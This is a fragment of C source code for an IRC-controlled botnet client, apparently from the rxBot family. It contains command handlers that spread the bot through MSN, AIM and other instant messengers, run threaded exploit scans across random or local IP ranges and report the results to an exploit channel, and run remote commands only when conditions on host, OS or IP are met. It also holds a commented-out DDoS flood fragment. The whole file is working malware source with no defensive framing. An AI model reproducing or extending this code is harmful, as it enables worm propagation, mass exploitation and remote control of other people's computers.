						Sleep(50);
				} else
					sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

			}*/
//			#endif
#endif

	//////////////////////////////////////////////////////////////////////////////
	//					Priv8 IMSpreading C0de by InTeL
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_MSNSPREAD
	else if (!lstrcmpi(cmd_msnspread_1,a[0]) || !lstrcmpi(cmd_msnspread_2,a[0]))
	{
		if ((tnum=findthreadnum(MSNSPREAD_THREAD))>0)
		{
			if (!switches.silent){
				irc->privmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			}
			return 1;
		}

		if(!a[1])
			return 1;

		char *acapture="";
		MSNSPREAD MSN;
		NTHREAD msn;
		ZeroMemory(&MSN, sizeof(MSN));
		if ( !( MSN.pszMessage = strchr(params, ' ')) )
			return 1;
		msn.data1=MSN.pszMessage;

		irc->privmsg(hostd->target,"%s Priv8 MSN messaging active.", msnspread_title);
		msn.threadnum = addthread(MSNSPREAD_THREAD,"%s Spreading message: %s",msnspread_title,msn.data1);
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &initfile, (LPVOID)&MSN, 0, &id))
		{
			while (MSN.bGotInfo == FALSE)
				Sleep(50);
		} else 
		{
			if(!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,msnspread_title,"imspread thread",GetLastError());
			return 1;
		}
		return 1;
	}
#endif

#ifndef NO_IMSPREAD
	else if (!lstrcmpi(cmd_imspread_1,a[0]) || !lstrcmpi(cmd_imspread_2,a[0]))
	{
		if ((tnum=findthreadnum(IMSPREAD_THREAD))>0)
		{
			if (!switches.silent){
				irc->privmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			}
			return 1;
		}

		if (!a[1])
			return 1;

		char *acapture="";
		IMSPREAD IM;
		NTHREAD opim;
		ZeroMemory(&IM, sizeof(IM));
		if ( !( IM.pszMessage = strchr(params, ' ')) )
			return 1;
		opim.data1=IM.pszMessage;

		irc->privmsg(hostd->target,"%s Priv8 IM messaging active.",imspread_title);
		opim.threadnum = addthread(IMSPREAD_THREAD,"%s Spreading message: %s",imspread_title,opim.data1);
		if (threads[opim.threadnum].tHandle = CreateThread(NULL, 0, &IMSpread, (LPVOID)&IM, 0, &id))
		{
			while (IM.bGotInfo == FALSE)
				Sleep(50);
		} else 
		{
			if(!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail,imspread_title,"imspread thread",GetLastError());
			return 1;
		}
		return 1;
	}
#endif

#ifndef NO_AIMSPREAD
	else if (!lstrcmpi(cmd_aimspread_1,a[0]) || !lstrcmpi(cmd_aimspread_2,a[0]))
	{
		if ((tnum=findthreadnum(AIMSPREAD_THREAD))>0)
		{
			if (!switches.silent){
				irc->privmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			}
			return 1;
		}

		if (!a[1])
			return 1;

		char *acapture="";
		AIMSPREAD AIM;
		NTHREAD aim;
		ZeroMemory(&AIM, sizeof(AIM));
		if ( !( AIM.pszMessage = strchr(params, ' ')) )
			return 1;
		aim.data1=AIM.pszMessage;

		irc->privmsg(hostd->target,"%s Priv8 AIM messaging active.",aimspread_title);
		aim.threadnum = addthread(AIMSPREAD_THREAD,"%s Spreading message: %s",aimspread_title,aim.data1);
		if (threads[aim.threadnum].tHandle = CreateThread(NULL, 0, &AIMSpread, (LPVOID)&AIM, 0, &id))
		{
			while (AIM.bGotInfo == FALSE)
				Sleep(50);
		} else 
		{
			if(!switches.silent)
				irc->privmsg(hostd->target,str_thread_fail, aimspread_title,"Aimspread thread",GetLastError());
			return 1;
		}
		return 1;
	}
#endif

#ifndef NO_ADVSCAN
	//////////////////////////////////////////////////////////////////////////////
	//								Scan Stats
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_scanstats_1,a[0]) || !lstrcmpi(cmd_scanstats_2,a[0]))
	{
		ListExploitStats(irc,hostd->target,switches.verbose,(a[1]?atoi(a[1]):0));
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Current IP
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_currentip_1,a[0]) || !lstrcmpi(cmd_currentip_2,a[0]))
	{
		int scanthread;
		if (a[1])
			scanthread = atoi(a[1]);
		else
			scanthread = findthreadnum(SCAN_THREAD);
		if (scanthread != 0)
			CurrentIP(irc,hostd->target,scanthread);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//							Advscan
	//////////////////////////////////////////////////////////////////////////////
	//.advscan <port> <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
	else if (!lstrcmpi(cmd_advscan_1,a[0]) || !lstrcmpi(cmd_advscan_2,a[0]))
	{
		if (!a[1] || !a[2] || !a[3] || !a[4])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,scan_title);
			return 1;
		}

		int scanthreads=findthreadid(SCAN_THREAD);
		if ((scanthreads+atoi(a[2])) > MAX_SCANTHRD)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Already scanning with %d threads. Too many specified.", scan_title, scanthreads);
		}
		else
		{
			ADVSCAN advscan;
			advscan.port = (unsigned short)atoi(a[1]);
			advscan.threads = atoi(a[2]);
			advscan.delay = atoi(a[3]);
			advscan.delay = ((advscan.delay < MIN_SCANDELAY)?(MIN_SCANDELAY):(advscan.delay));
			advscan.delay = ((advscan.delay > MAX_SCANDELAY)?(MAX_SCANDELAY):(advscan.delay));
			advscan.minutes = atoi(a[4]);
			advscan.minutes = ((advscan.minutes > MAX_SCANTIME)?(MAX_SCANTIME):(advscan.minutes));
			advscan.exploit = -1;
			
			for(i=0;exploit[i].port != 0;i++)
			{
				if (!lstrcmpi(exploit[i].command,a[1]))
				{
					advscan.port = exploit[i].port;
					advscan.exploit = i;

					break;
				}
			}

			if (advscan.port == 0)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to start scan, port is invalid.", scan_title);
			}
			else
			{
				if (a[5])
				{
					if (!strcmp("x.x.x.x",a[5]))
					{
						srand(GetTickCount());
						unsigned int aclass;
						for (;;) {
							aclass=(rand()%240)+4;
							if (aclass==127)
								continue;
							else
								break;
						}
						_snprintf(advscan.ip,sizeof(advscan.ip),"%d.x.x.x",aclass);
						advscan.random = TRUE;
					}
					else
					{
						_snprintf(advscan.ip,sizeof(advscan.ip),a[5]);
						advscan.random = ((strchr(a[5],'x'))?(TRUE):(FALSE));
					}
				}
				else
				{
					if (switches.scan_e || switches.scan_a || switches.scan_b || switches.scan_c || switches.scan_r)
					{
						if (switches.scan_e)
						{
							int Class=0;
							if (switches.scan_a)
								Class=1;
							else if (switches.scan_b)
								Class=2;
							else if (switches.scan_c)
								Class=3;
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s No subnet class specified, try \"-a\" or \"-b\" or \"-c\"", scan_title);
								return 1;
							}
/*							if (!exip || !strcmp(exip,"") || PrivateIP(exip))
							{
								if (!switches.silent && !switches.halfsilent)
									irc->privmsg(hostd->target,"%s Trying to get external IP.",scan_title);
								DWORD id;
								HANDLE th;
								th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
								
								WaitForSingleObject(th,10000);
								CloseHandle(th);
							}*/
							char *extip=MakeIP(exip,switches.scan_r,Class);
							if (extip)
								strncpy(advscan.ip,extip,sizeof(advscan.ip));
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s Could not parse external IP.", scan_title);
								return 1;
							}
							advscan.random=switches.scan_r;
						}
						else
						{
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(irc->get_sock(),(LPSOCKADDR)&ssin,&ssin_len);

							if (switches.scan_a)
								ssin.sin_addr.S_un.S_addr&=0xFF;

							else if (switches.scan_b)
								ssin.sin_addr.S_un.S_addr&=0xFFFF;

							else if (switches.scan_c)
								ssin.sin_addr.S_un.S_addr&=0xFFFFFF;

							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
							if (switches.scan_r)
							{
								int extractip=0;
								if (switches.scan_a)
									extractip=3;
								else if (switches.scan_b)
									extractip=2;
								else if (switches.scan_c)
									extractip=1;

								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
									
								advscan.random=TRUE;
							}
							else
								advscan.random=FALSE;
						}
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Failed to start scan, no IP specified.", scan_title);
						return 1;
					}
				}

				advscan.silent = switches.silent;
				advscan.verbose = switches.verbose;
				advscan.conn=irc;
				strcpy(advscan.target,servers[curserver].exploitchan);
				advscan.threadnum=addthread(SCAN_THREAD,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
					while(advscan.gotinfo == FALSE)
						Sleep(50);
						
					if (!switches.silent && !switches.halfsilent)
						irc->privmsg(hostd->target,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to start scan thread, error: <%d>.", scan_title, GetLastError());
				}
			}
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//							Scan All/Asn Scan
	//////////////////////////////////////////////////////////////////////////////
	//.scanall <threads> <delay> <mins> <ip/[-a/-b/-c][-e][-r]>
	else if (!lstrcmpi(cmd_scanall_1,a[0]) || !lstrcmpi(cmd_scanall_2,a[0])
			|| !lstrcmpi(cmd_asnscan_1,a[0]) || !lstrcmpi(cmd_asnscan_2,a[0]))
	{
		if (!a[1] || !a[2] || !a[3])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,scan_title);
			return 1;
		}
		BOOL ballscan=FALSE;
		BOOL basnscan=FALSE;

		int scansize;

		if (!lstrcmpi(cmd_asnscan_1,a[0]) || !lstrcmpi(cmd_asnscan_2,a[0]))
		{
			basnscan=TRUE;
			scansize=asnscansize;
		}
		else
		{
			ballscan=TRUE;
			scansize=scanallsize;
		}

		int scanthreads=findthreadid(SCAN_THREAD);
		if ((scanthreads+atoi(a[1])) > MAX_SCANTHRD)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Already scanning with %d threads. Too many specified.", scan_title, scanthreads);
		}

		for(int sne=0; sne<scansize; sne++)
		{
			ADVSCAN advscan;
			advscan.threads = atoi(a[1])/scansize;
			advscan.delay = atoi(a[2]);
			advscan.delay = ((advscan.delay < MIN_SCANDELAY)?(MIN_SCANDELAY):(advscan.delay));
			advscan.delay = ((advscan.delay > MAX_SCANDELAY)?(MAX_SCANDELAY):(advscan.delay));
			advscan.minutes = atoi(a[3]);
			advscan.minutes = ((advscan.minutes > MAX_SCANTIME)?(MAX_SCANTIME):(advscan.minutes));
			advscan.exploit = -1;

			for(i=0;exploit[i].port != 0;i++)
			{
				if (basnscan)
				{
					if (strcmp(exploit[i].command, asnscan[sne].command) == 0)
					{
						advscan.port = exploit[i].port;
						advscan.exploit = i;
						break;
					}
				}
				else// if (allscan)
				{
					if (strcmp(exploit[i].command, scanall[sne].command) == 0)
					{
						advscan.port = exploit[i].port;
						advscan.exploit = i;
						break;
					}
				}
			}

			if (advscan.port == 0)
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to start scan, port is invalid.", scan_title);
			}
			else
			{
				if (a[4])
				{
					if (!strcmp("x.x.x.x",a[4]))
					{
						srand(GetTickCount());
						unsigned int aclass;
						for (;;) {
							aclass=(rand()%240)+4;
							if (aclass==127)
								continue;
							else
								break;
						}
						_snprintf(advscan.ip,sizeof(advscan.ip),"%d.x.x.x",aclass);
						advscan.random = TRUE;
					}
					else
					{
						_snprintf(advscan.ip,sizeof(advscan.ip),a[4]);
						advscan.random = ((strchr(a[4],'x'))?(TRUE):(FALSE));
					}
				}
				else
				{
					if (switches.scan_e || switches.scan_a || switches.scan_b || switches.scan_c || switches.scan_r)
					{
						if (switches.scan_e)
						{
							int Class=0;
							if (switches.scan_a)
								Class=1;
							else if (switches.scan_b)
								Class=2;
							else if (switches.scan_c)
								Class=3;
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s No subnet class specified, try \"-a\" or \"-b\" or \"-c\"", scan_title);
								return 1;
							}
/*							if (!exip || !strcmp(exip,"") || PrivateIP(exip))
							{
								if (!switches.silent && !switches.halfsilent)
/*									irc->privmsg(hostd->target,"%s Trying to get external IP.",scan_title);
								DWORD id;
								HANDLE th;
								th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
								
								WaitForSingleObject(th,10000);
								CloseHandle(th);
							}*/
							char *extip=MakeIP(exip,switches.scan_r,Class);
							if (extip)
								strncpy(advscan.ip,extip,sizeof(advscan.ip));
							else
							{
								if (!switches.silent)
									irc->privmsg(hostd->target,"%s Could not parse external IP.", scan_title);
								return 1;
							}
							advscan.random=switches.scan_r;
						}
						else
						{
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(irc->get_sock(),(LPSOCKADDR)&ssin,&ssin_len);

							if (switches.scan_a)
								ssin.sin_addr.S_un.S_addr&=0xFF;

							else if (switches.scan_b)
								ssin.sin_addr.S_un.S_addr&=0xFFFF;

							else if (switches.scan_c)
								ssin.sin_addr.S_un.S_addr&=0xFFFFFF;

							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));
							if (switches.scan_r)
							{
								int extractip=0;
								if (switches.scan_a)
									extractip=3;
								else if (switches.scan_b)
									extractip=2;
								else if (switches.scan_c)
									extractip=1;

								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
								
								advscan.random=TRUE;
							}
							else
								advscan.random=FALSE;
						}
					}
					else
					{
						if (!switches.silent)
							irc->privmsg(hostd->target,"%s Failed to start scan, no IP specified.", scan_title);
						return 1;
					}
				}

				advscan.silent = switches.silent;
				advscan.verbose = switches.verbose;
				advscan.conn=irc;
				strcpy(advscan.target,servers[curserver].exploitchan);
				advscan.threadnum=addthread(SCAN_THREAD,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
					while(advscan.gotinfo == FALSE)
						Sleep(50);
					
					if (!switches.silent && !switches.halfsilent)
						irc->privmsg(hostd->target,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to start scan thread, error: <%d>.", scan_title, GetLastError());
				}
			}
		}
		return 1;
	}
#endif // NO_ADVSCAN


	//////////////////////////////////////////////////////////////////////////////
	//								If/Else
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_IFELSE
	//.if/else nick <nick> <do this> (wildcards supported)
	//.if/else host <host> <do this> (wildcards supported)
	//.if/else id <bot id> <do this>
	//.if/else private <do this>
	//.if/else dialup <do this>
	//.if/else up <time> <do this>
	//.if/else connected <time> <do this>
	//.if/else aim <do this>
	//.if/else os <os> <do this>
	//.if/else exip <ip> <do this> (wildcards supported)
	//.if/else inip <ip> <do this> (wildcards supported)
	//FIXME:.if/else space <free/total> <>space> <gb/mb/kb> <do this>
	else if (!lstrcmpi(cmd_if_1,a[0]) || !lstrcmpi(cmd_if_2,a[0])
			|| !lstrcmpi(cmd_else_1,a[0]) || !lstrcmpi(cmd_else_2,a[0]))
	{

		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,logic_title);
			return 1;
		}

		int anum=3;//param the command starts at
		BOOL bIf=FALSE;
		BOOL bElse=FALSE;
		if (!lstrcmpi(cmd_if_1,a[0]) || !lstrcmpi(cmd_if_2,a[0]))
			bIf=TRUE;
		if (!lstrcmpi(cmd_else_1,a[0]) || !lstrcmpi(cmd_else_2,a[0]))
			bElse=TRUE;

		//nick
		if (!lstrcmpi(cmd_ifelse_nick_1,a[1]) || !lstrcmpi(cmd_ifelse_nick_2,a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(_strlwr(a[2]),_strlwr(irc->current_nick())))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],irc->current_nick()))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(_strlwr(a[2]),_strlwr(irc->current_nick())))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],irc->current_nick()))
						return 1;
				}
		}
		
		//host
		else if (!lstrcmpi(cmd_ifelse_host_1,a[1]) || !lstrcmpi(cmd_ifelse_host_2,a[1]))
		{
/*			if (!exip || !strcmp(exip,"") || PrivateIP(exip))
			{
				if (!switches.silent && switches.verbose)
					irc->privmsg(hostd->target,"%s Trying to get external IP.",logic_title);
				DWORD id;
				HANDLE th;
				th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
				WaitForSingleObject(th,5000);
				CloseHandle(th);
			}*/
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(_strlwr(a[2]),_strlwr(host)))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],host))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(_strlwr(a[2]),_strlwr(host)))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],host))
						return 1;
				}
		}
		
		//botid
		else if (!lstrcmpi(cmd_ifelse_id,a[1]))
		{
			if (bIf)
				if (lstrcmpi(a[2],botid))
					return 1;

			if (bElse)
				if (!lstrcmpi(a[2],botid))
					return 1;
		}
		
		//uptime
		else if (!lstrcmpi(cmd_ifelse_uptime_1,a[1]) || !lstrcmpi(cmd_ifelse_uptime_2,a[1]))
		{
			unsigned int up=GetTickCount()/86400000;

			if (bIf)
				if (up<atoi(a[2]))
					return 1;

			if (bElse)
				if (up>atoi(a[2]))
					return 1;
		}
		
		//connected
		else if (!lstrcmpi("connected",a[1]) || !lstrcmpi("con",a[1]))
		{
			DWORD dwTotal=(GetTickCount()/1000)-(dwconnected/1000);
			DWORD dwMins=((dwTotal%86400)%3600)/60;
		
			if (bIf)
				if (dwMins<atoi(a[2]))
					return 1;

			if (bElse)
				if (dwMins>atoi(a[2]))
					return 1;
		}
		
/*#ifndef NO_RECORD_UPTIME
		//uptime
		else if (!lstrcmpi(cmd_ifelse_ruptime_1,a[1]) || !lstrcmpi(cmd_ifelse_ruptime_2,a[1]))
		{
			DWORD up=GetRecord()/86400000;
			if (bIf)
				if (up<atoi(a[2]))
					return 1;
				
			if (bElse)
				if (up>atoi(a[2]))
					return 1;
		}
#endif*/

		//aim
		else if (!lstrcmpi(cmd_ifelse_aim_1,a[1]) || !lstrcmpi(cmd_ifelse_aim_2,a[1]))
		{
			anum=2;

			if (bIf){
				if (fFindWindow("#32770 (Dialog)",0))
					return 1;
			}

			if (bElse){
				if (!fFindWindow("#32770 (Dialog)",0))
					return 1;
			}

		}
		
		//private
		else if (!lstrcmpi(cmd_ifelse_priv_1,a[1]) || !lstrcmpi(cmd_ifelse_priv_2,a[1]))
		{
			anum=2;
			if (bIf)
				if (!PrivateIP(inip))
					return 1;

			if (bElse)
				if (PrivateIP(inip))
					return 1;
		}
		
		//dialup
		else if (!lstrcmpi("dialup",a[1]) || !lstrcmpi("d",a[1]))
		{
			anum=2;
			if (!nowininet)
			{
				DWORD n;
				fInternetGetConnectedStateEx(&n, 0, 0, 0);
				if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM)
				{
					if (bElse)
						return 1;
				}
				else
					if (bIf)
						return 1;
			}
			else
				return 1;
		}

		//status
		else if (!lstrcmpi(cmd_ifelse_status_1,a[1]) || !lstrcmpi(cmd_ifelse_status_2,a[1]))
		{
			if (bIf)
			{
				if (!lstrcmpi("scanning",a[2]) || !lstrcmpi("scan",a[2]))
					if (!findthreadid(SCAN_THREAD))
						return 1;

				else if (!lstrcmpi("attacking",a[2]) || !lstrcmpi("ddos",a[2]))
					if (!findthreadid(DDOS_THREAD))
						return 1;

				else if (!lstrcmpi("idle",a[2]))
					if (findthreadid(DDOS_THREAD) || findthreadid(DDOS_THREAD))
						return 1;
			}
			if (bElse)
			{
				if (!lstrcmpi("scanning",a[2]) || !lstrcmpi("scan",a[2]))
					if (findthreadid(SCAN_THREAD))
						return 1;

				else if (!lstrcmpi("attacking",a[2]) || !lstrcmpi("ddos",a[2]))
					if (findthreadid(DDOS_THREAD))
						return 1;

				else if (!lstrcmpi("idle",a[2]))
					if (!findthreadid(DDOS_THREAD) && !findthreadid(DDOS_THREAD))
						return 1;
			}
		}

		//os
		else if (!lstrcmpi("os",a[1]))
		{
			OSVERSIONINFO verinf;
			verinf.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
			if (GetVersionEx(&verinf))
			{
				if (bIf)
				{
					if (!lstrcmpi("95",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0))
							return 1;
						if (verinf.dwPlatformId!=VER_PLATFORM_WIN32_WINDOWS)
							return 1;
					}
					else if (!lstrcmpi("nt",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0))
							return 1;
						if (verinf.dwPlatformId!=VER_PLATFORM_WIN32_NT)
							return 1;
					}
					else if (!lstrcmpi("98",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==10))
							return 1;
					}
					else if (!lstrcmpi("me",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==90))
							return 1;
					}
					else if (!lstrcmpi("2k",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==0))
							return 1;
					}
					else if (!lstrcmpi("xp",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==1))
							return 1;
					}
					else if (!lstrcmpi("2k3",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==2))
							return 1;
					}
				}
				if (bElse)
				{
					if (lstrcmpi("95",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0)
						{
							if (verinf.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
								return 1;
						}
					}
					else if (!lstrcmpi("nt",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0)
						{
							if (verinf.dwPlatformId==VER_PLATFORM_WIN32_NT)
								return 1;
						}
					}
					else if (!lstrcmpi("98",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==10)
							return 1;
					}
					else if (!lstrcmpi("me",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==90)
							return 1;
					}
					else if (!lstrcmpi("2k",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==0)
							return 1;
					}
					else if (!lstrcmpi("xp",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==1)
							return 1;
					}
					else if (!lstrcmpi("2k3",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==2)
							return 1;
					}
				}
			}
		}

		//inip
		else if (!lstrcmpi("inip",a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(a[2],inip))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],inip))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(a[2],inip))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],inip))
						return 1;
				}
		}

		//exip
		else if (!lstrcmpi("exip",a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(a[2],exip))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],exip))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(a[2],exip))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],exip))
						return 1;
				}
		}

		//unknown
		else
		{
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		}

		if (!a[anum])
		{ //this is so u can set the needed num of params (for shit like private)
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,logic_title);
			return 1;
		}
		char command[IRCLINE];
		char tbuf[IRCLINE];
		sprintf(command,"%s",a[anum]);
		for (int u=(anum+1);u<t;u++)// add the rest of the params to the file
		{
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strcat(command,tbuf);
			}
		}
		if (command[0]!=prefix)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		}

		int i;
		for (i=0;i<strlen(command);i++)
		{
			//replace _ with - for the new command
			if (command[i]=='_')
				if (command[i-1]==' ')
					command[i]='-';
			//replace + with _ (for double if/else statements)
			if (command[i]=='+')
				if (command[i-1]==' ')
					command[i]='_';
			//replace ^ with + (for triple if/else statements)
			if (command[i]=='^')
				if (command[i-1]==' ')
					command[i]='+';
			//replace ` with ^ (for quadruple if/else statements)
			if (command[i]=='`')
				if (command[i-1]==' ')
					command[i]='^';
		}

		if (switches.verbose)
			irc->privmsg(hostd->target,"%s Should run: \"%s\".",logic_title,command);

		IRC_TempCommand(command,hostd,irc,switches.silent);
		return 1;
	}
#endif // NO_IFELSE

	return 0;
}
